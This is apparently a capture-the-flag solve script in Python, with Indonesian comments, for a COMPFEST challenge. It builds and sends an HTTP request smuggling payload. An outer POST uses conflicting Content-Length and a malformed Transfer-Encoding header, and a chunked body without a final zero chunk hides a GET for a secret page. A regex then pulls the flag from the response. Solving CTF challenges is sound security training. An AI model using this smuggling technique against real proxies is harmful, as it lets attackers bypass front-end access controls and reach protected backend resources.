# sol.py (Definitive)
import socket
import re
import time

# --- Konfigurasi ---
PROXY_HOST = "ctf.compfest.id" 
PROXY_PORT = 7304 # Sesuaikan port jika berbeda

def solve():
    # Request yang ingin kita selundupkan.
    # Perhatikan tidak ada \r\n di akhir, karena akan kita tambahkan nanti.
    smuggled_request = b"GET /%73ecret.html HTTP/1.1\r\n"
    smuggled_request += b"Host: backend-server\r\n"
    smuggled_request += b"X-Dummy-Header: find-the-flag\r\n\r\n"

    # --- Kunci Serangan Baru ---
    # Alih-alih '0\r\n\r\n', kita bungkus smuggled_request dalam satu chunk.
    # Format: <ukuran_hex>\r\n<data>\r\n. Request ini sengaja dibuat "gantung"
    # karena tidak ada chunk '0' sebagai penutup.
    body = f"{len(smuggled_request):x}\r\n".encode() + smuggled_request + b"\r\n"

    # Request utama yang membawa payload.
    main_request_headers = b"POST / HTTP/1.1\r\n"
    main_request_headers += b"Host: " + PROXY_HOST.encode() + b"\r\n"
    # Content-Length disesuaikan dengan panjang body baru kita.
    main_request_headers += f"Content-Length: {len(body)}\r\n".encode()
    main_request_headers += b"Transfer_Encoding: chunked\r\n"
    main_request_headers += b"\r\n"

    # Gabungkan semua menjadi payload final.
    payload = main_request_headers + body

    print("--- Payload Final yang Dikirim ---")
    print(payload.decode(errors='ignore'))
    print("----------------------------------\n")

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((PROXY_HOST, PROXY_PORT))
        
        s.sendall(payload)
        
        time.sleep(1)

        response = s.recv(4096).decode(errors='ignore')

        print("--- Respons Diterima ---")
        print(response)
        print("------------------------\n")

        # Cari flag dalam respons
        flag_pattern = r"CF\d+\{[a-zA-Z0-9_!@#$%^&*-]+\}"
        flag = re.search(flag_pattern, response)
        if flag:
            print(f"[*] Flag ditemukan: {flag.group(0)}")
        else:
            print("[!] Flag tidak ditemukan dalam respons.")

if __name__ == "__main__":
    solve()